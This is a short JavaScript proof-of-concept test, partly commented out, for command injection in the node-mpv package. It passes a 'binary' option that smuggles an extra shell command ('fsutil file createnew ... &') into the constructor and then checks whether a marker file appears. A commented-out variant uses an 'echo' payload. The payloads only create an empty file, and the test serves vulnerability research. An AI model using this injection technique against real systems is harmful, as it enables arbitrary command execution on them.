// test("Command Injection in node-mpv", () => {
//   expect.assertions(2);
  const Root = require("node-mpv");
  const fs = require("fs");
  const path = "./node-mpv";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  var options = { binary: '"fsutil file createnew node-mpv 0 &"' };
  //var options = { binary: 'echo. > lycwed-spritesheetjs &' };
  try {
    var root = new Root(options);
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
